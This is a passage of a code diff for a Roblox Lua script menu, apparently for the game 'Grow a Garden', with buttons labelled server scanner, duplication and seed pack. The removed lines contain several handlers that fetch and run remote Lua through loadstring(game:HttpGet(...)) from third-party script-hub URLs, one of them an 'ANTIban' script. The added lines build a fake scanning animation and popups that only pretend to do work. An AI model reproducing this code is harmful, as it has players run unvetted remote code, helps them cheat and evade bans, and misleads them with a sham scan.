+			close = closeScanner,
+			scanButton = scanButton,
+			closeButton = closeButton,
+			animateScan = animateScan
+		}
+	end
+	
+	-- ================ MAIN EXECUTION ================
+	local scannerUI = createScannerUI()
+	
+	-- Connect buttons
+	button.MouseButton1Click:Connect(function()
+		scannerUI.open()
 	end)
-end
-coroutine.wrap(KWGGR_fake_script)()
-local function XQYGU_fake_script() -- EGGESP.LocalScript 
-	local script = Instance.new('LocalScript', EGGESP)
-
-	-- Place this LocalScript inside your 'Server Scanner' TextButton
+	
+	scannerUI.closeButton.MouseButton1Click:Connect(function()
+		scannerUI.close()
+	end)
+	
+	scannerUI.scanButton.MouseButton1Click:Connect(function()
+		scannerUI.scanButton.Text = "SCANNING..."
+		scannerUI.scanButton.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
+	
+		-- Run scan animation
+		task.spawn(scannerUI.animateScan)
+	
+		-- Reset button after scan
+		task.wait(2.5)
+		scannerUI.scanButton.Text = "RESCAN"
+		scannerUI.scanButton.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+	end)
+end;
+task.spawn(C_1a);
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.DUPLICATION.LocalScript
+local function C_1d()
+local script = G2L["1d"];
 	local button = script.Parent
-	local mainFrame = button.Parent.Parent -- Goes up to ScrollingFrame then to MainFrame
-	local debounce = false
+	local player = game:GetService("Players").LocalPlayer
+	local gui = player:WaitForChild("PlayerGui"):WaitForChild("ScreenGui")
+	local dPopFrame = gui:WaitForChild("DPOP")
+	local tweenService = game:GetService("TweenService")
+	
+	-- Animation settings
+	local fadeTime = 0.3
+	local easeStyle = Enum.EasingStyle.Quad
+	local easeDirection = Enum.EasingDirection.Out
+	
+	-- List of frames that should remain transparent
+	local transparentFrames = {
+		NOTICE = true,
+		DESCRIPTION = true
+	}
 	
 	button.MouseButton1Click:Connect(function()
-		if debounce then return end
-		debounce = true
+		if dPopFrame then
+			-- Prepare for fade in
+			dPopFrame.Visible = true
+			dPopFrame.BackgroundTransparency = transparentFrames[dPopFrame.Name] and 1 or 1 -- Start transparent
 	
-		-- Visual feedback
-		local originalText = button.Text
-		local originalColor = button.BackgroundColor3
+			-- Get all descendant UI elements to fade
+			local descendants = dPopFrame:GetDescendants()
+			for _, element in ipairs(descendants) do
+				if element:IsA("GuiObject") then
+					-- Skip fading background for transparent frames
+					if not transparentFrames[element.Name] then
+						element.BackgroundTransparency = 1
+					end
 	
-		button.Text = "EXECUTING..."
-		button.BackgroundColor3 = Color3.fromRGB(0, 100, 200) -- Blue during scan
-	
-		-- Execute the external script with error handling
-		local success, err = pcall(function()
-			loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
-		end)
-	
-		-- Results handling
-		if success then
-			button.Text = "EXECUTED!"
-			if mainFrame:FindFirstChild("ScanResults") then
-				mainFrame.ScanResults.Text = "External script executed successfully"
+					-- Always fade text
+					if element:IsA("TextLabel") or element:IsA("TextButton") or element:IsA("TextBox") then
+						element.TextTransparency = 1
+					end
+				end
 			end
-		else
-			button.Text = "EXECUTION FAILED!"
-			if mainFrame:FindFirstChild("ScanResults") then
-				mainFrame.ScanResults.Text = "Error: "..tostring(err):sub(1, 100)
+	
+			-- Create tweens
+			local tweenInfo = TweenInfo.new(fadeTime, easeStyle, easeDirection)
+	
+			-- Tween main frame background (if not transparent)
+			if not transparentFrames[dPopFrame.Name] then
+				local frameTween = tweenService:Create(dPopFrame, tweenInfo, {BackgroundTransparency = 0})
+				frameTween:Play()
 			end
-			warn("ServerScanner Error:", err)
+	
+			-- Tween all elements
+			for _, element in ipairs(descendants) do
+				if element:IsA("GuiObject") then
+					-- Tween background (if not transparent frame)
+					if not transparentFrames[element.Name] then
+						local elementTween = tweenService:Create(element, tweenInfo, {BackgroundTransparency = 0})
+						elementTween:Play()
+					end
+	
+					-- Always tween text
+					if element:IsA("TextLabel") or element:IsA("TextButton") or element:IsA("TextBox") then
+						local textTween = tweenService:Create(element, tweenInfo, {TextTransparency = 0})
+						textTween:Play()
+					end
+				end
+			end
 		end
-	
-		-- Reset after 2 seconds
-		task.wait(2)
-		button.Text = originalText
-		button.BackgroundColor3 = originalColor
-		debounce = false
 	end)
-end
-coroutine.wrap(XQYGU_fake_script)()
-local function UKCD_fake_script() -- SPAWNER.ToggleSpawnerFrame 
-	local script = Instance.new('LocalScript', SPAWNER)
-
-	local spawnerButton = script.Parent
-	local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-	local screenGui = playerGui:WaitForChild("ScreenGui")
-	local frame = screenGui:WaitForChild("Frame")
-	local warningFrame = frame:WaitForChild("SPAWNER")
+end;
+task.spawn(C_1d);
+-- StarterGui.ScreenGui.DPOP.Frame.CLOSE.LocalScript
+local function C_28()
+local script = G2L["28"];
+	local button = script.Parent
+	local dPopFrame = button:FindFirstAncestor("DPOP")
+	local tweenService = game:GetService("TweenService")
 	
-	spawnerButton.MouseButton1Click:Connect(function()
-		warningFrame.Visible = true
-	end)
-end
-coroutine.wrap(UKCD_fake_script)()
-local function MCPCLV_fake_script() -- a.LocalScript 
-	local script = Instance.new('LocalScript', a)
-
-	-- Place this LocalScript inside your SEEDPACK button
-	local seedpackButton = script.Parent
-	local warningFrame = seedpackButton.Parent.Parent:WaitForChild("WARNING") -- Goes up two levels
+	-- Animation settings
+	local fadeTime = 0.3
+	local easeStyle = Enum.EasingStyle.Quad
+	local easeDirection = Enum.EasingDirection.Out
 	
-	seedpackButton.MouseButton1Click:Connect(function()
-		warningFrame.Visible = not warningFrame.Visible -- Toggle visibility
-	end)
-end
-coroutine.wrap(MCPCLV_fake_script)()
-local function JXNUPO_fake_script() -- CLOSE.LocalScript 
-	local script = Instance.new('LocalScript', CLOSE)
-
-	local closeButton = script.Parent
-	local frame = closeButton.Parent
+	-- List of frames that should remain transparent
+	local transparentFrames = {
+		NOTICE = true,
+		DESCRIPTION = true
+	}
 	
-	closeButton.MouseButton1Click:Connect(function()
-		frame.Visible = false
-	end)
+	button.MouseButton1Click:Connect(function()
+		if dPopFrame then
+			-- Immediately disable input to prevent clicks during animation
+			dPopFrame.Active = false
+			dPopFrame.Visible = true -- Ensure it's visible for the fade-out
 	
-end
-coroutine.wrap(JXNUPO_fake_script)()
-local function KWVVTZ_fake_script() -- OPEN.LocalScript 
-	local script = Instance.new('LocalScript', OPEN)
-
-	local openButton = script.Parent
-	local frame = openButton.Parent:WaitForChild("MainFrame")
+			local descendants = dPopFrame:GetDescendants()
+			local tweenInfo = TweenInfo.new(fadeTime, easeStyle, easeDirection)
 	
-	openButton.MouseButton1Click:Connect(function()
-		frame.Visible = true
-	end)
+			-- Tween main frame (if not transparent)
+			if not transparentFrames[dPopFrame.Name] then
+				local frameTween = tweenService:Create(dPopFrame, tweenInfo, {BackgroundTransparency = 1})
+				frameTween:Play()
+			end
 	
-end
-coroutine.wrap(KWVVTZ_fake_script)()
-local function IOXD_fake_script() -- script.LocalScript 
-	local script = Instance.new('LocalScript', script)
-
-	-- Place this LocalScript inside your pop-up's action button
-	local actionButton = script.Parent
-	local warningFrame = actionButton.Parent -- Assuming button is direct child of WARNING frame
-	local debounce = false
+			-- Tween all elements
+			for _, element in ipairs(descendants) do
+				if element:IsA("GuiObject") then
+					-- Tween background (if not transparent frame)
+					if not transparentFrames[element.Name] then
+						local elementTween = tweenService:Create(element, tweenInfo, {BackgroundTransparency = 1})
+						elementTween:Play()
+					end
 	
-	actionButton.MouseButton1Click:Connect(function()
-		if debounce then return end
-		debounce = true
+					-- Always tween text
+					if element:IsA("TextLabel") or element:IsA("TextButton") or element:IsA("TextBox") then
+						local textTween = tweenService:Create(element, tweenInfo, {TextTransparency = 1})
+						textTween:Play()
+					end
+				end
+			end
 	
-		-- Visual feedback: show loading state
-		local originalText = actionButton.Text
-		actionButton.Text = "EXECUTING..."
-		actionButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-	
-		-- Execute the external script
-		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/SEEDPACK", true))()
-		end)
-	
-		-- Close the warning frame regardless of success
-		warningFrame.Visible = false
-	
-		-- Handle results
-		if success then
-			actionButton.Text = "SUCCESS!"
-		else
-			actionButton.Text = "ERROR!"
-			warn("Script execution failed:", err)
+			-- Hide after animation
+			task.delay(fadeTime, function()
+				dPopFrame.Visible = false
+				-- Don't reset properties here if you want it to stay hidden
+			end)
 		end
-	
-		-- Reset after 1 second
-		task.wait(1)
-		actionButton.Text = originalText
-		actionButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-		debounce = false
 	end)
-end
-coroutine.wrap(IOXD_fake_script)()
-local function XCJZGN_fake_script() -- CLOSE_2.LocalScript 
-	local script = Instance.new('LocalScript', CLOSE_2)
+end;
+task.spawn(C_28);
 
-	local closeButton = script.Parent
-	local frame = closeButton.Parent
-	
-	closeButton.MouseButton1Click:Connect(function()
-		frame.Visible = false
-	end)
-	
-end
-coroutine.wrap(XCJZGN_fake_script)()
-local function UZEE_fake_script() -- script_2.LocalScript 
-	local script = Instance.new('LocalScript', script_2)
-
-		-- Place this LocalScript inside your pop-up's action button
-	local actionButton = script.Parent
-	local warningFrame = actionButton.Parent -- Assuming button is direct child of WARNING frame
-	local debounce = false
-	
-	actionButton.MouseButton1Click:Connect(function()
-		if debounce then return end
-		debounce = true
-	
-		-- Visual feedback: show loading state
-		local originalText = actionButton.Text
-		actionButton.Text = "EXECUTING..."
-		actionButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-	
-		-- Execute the external script
-		local success, err = pcall(function()
-			loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/ANTIban.lua", true ))()
-		end)
-	
-		-- Close the warning frame regardless of success
-		warningFrame.Visible = false
-	
-		-- Handle results
-		if success then
-			actionButton.Text = "SUCCESS!"
-		else
-			actionButton.Text = "ERROR!"
-			warn("Script execution failed:", err)
-		end
-	
-		-- Reset after 1 second
-		task.wait(1)
-		actionButton.Text = originalText
-		actionButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-		debounce = false
-	end)
-end
-coroutine.wrap(UZEE_fake_script)()
-local function CQLVIR_fake_script() -- CLOSE_3.LocalScript 
-	local script = Instance.new('LocalScript', CLOSE_3)
-
-	local closeButton = script.Parent
-	local frame = closeButton.Parent
-	
-	closeButton.MouseButton1Click:Connect(function()
-		frame.Visible = false
-	end)
-	
-end
-coroutine.wrap(CQLVIR_fake_script)()
+return G2L["1"], require;
